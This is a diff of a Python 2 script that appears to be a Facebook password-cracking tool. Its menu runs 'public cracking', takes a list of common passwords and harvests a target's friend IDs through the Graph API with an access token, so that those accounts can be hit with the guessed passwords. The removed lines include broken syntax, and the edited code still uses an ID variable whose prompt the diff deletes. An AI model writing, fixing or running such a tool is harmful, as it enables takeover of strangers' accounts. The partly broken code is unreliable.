@@ -256,7 +256,7 @@ def pilih_super():
 	id = []
         cps = []
         oks = []
-	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
+	peak = raw_input(' \033[1;93mSelect One: ')
         if peak =="1":
 		print '\033[1;31;1m~~~~ public cracking ~~~~'
                 print ''
@@ -281,8 +281,8 @@ def pilih_super():
 		for s in q['data']:
 			id.append(s['id'])
 		
-	if peak =="2":
-                print '\033[1;31;1m~~~~ public cracking ~~~~'
+	elif peak =="2":
+		print '\033[1;31;1m~~~~ public cracking ~~~~'
                 print ''
                 print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
                 print ''
@@ -294,26 +294,16 @@ def pilih_super():
                 pass6 = raw_input(' \033[1;92m[6]Password: ')
                 pass7 = raw_input(' \033[1;92m[7]Password: ')
                 pass8 = raw_input(' \033[1;92m[8]Password: ')
-                idt = raw_input(' \033[1;93m[★]Enter id: ')
-		
 	try:
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
 		q = json.loads(r.text)
 		z = q['name']
-			id.append(i['id']))
-		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m"op+nama"
-	except KeyError:
-		print"\x1b[1;97mID Not Found!"
-		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
-		print"\033[1;97m[✔] Getting IDs..."
-		super()
-	        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
-                z = json.loads(r.text)
-                for i in z['data']:
-                    uid = i['id']
-                    na = i['name']
-                    nm = na.rsplit(' ')[0]
-                    id.append(uid + '|' + nm)
+		os.system('clear')
+		logo()
+		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+q["name"]
+		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
+		for s in q['data']:
+			id.append(s['id'])
 	if peak =="3":
                 os.system('clear')
                 logo()
